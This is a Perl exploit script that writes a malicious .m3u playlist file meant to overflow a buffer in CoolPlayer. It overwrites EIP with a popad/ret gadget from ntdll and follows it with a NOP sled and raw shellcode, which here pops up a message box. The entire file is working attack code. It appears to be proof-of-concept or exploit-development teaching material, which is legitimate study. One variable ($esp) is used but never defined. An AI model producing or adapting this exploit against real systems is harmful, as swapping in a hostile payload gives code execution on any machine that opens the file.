#!/usr/bin/perl
 
my $buffsize = 10000; # set consistent buffer size
my $junk = "\x41" x 260; # offset to EIP
my $eip = pack('V',0x7C86467B); # EIP overwrite w/ popad ret (ntdll)
my $jmp = "\x61"; # popad
$jmp = $jmp . "\xff\xe4";
my $regs = "\x42" x 32; # account for registers populated by popad
my $nops = "\x90" x 20;
 
# modified messagebox shellcode from Giuseppe D'Amore
my $shell = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42" .
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03" .
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b" .
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e" .
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c" .
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x4f\x46" .
"\x21\x01\x68\x61\x64\x20\x42\x68\x20\x50\x6f\x70\x89\xe1\xfe" .
"\x49\x0b\x31\xc0\x51\x50\xff\xd7";
 
my $sploit = $junk.$eip.$regs.$esp.$nops.$shell; # build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer
my $buffer = $sploit.$fill; # build final buffer


# write the exploit buffer to file
my $file = "coolplayer_popad2.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";
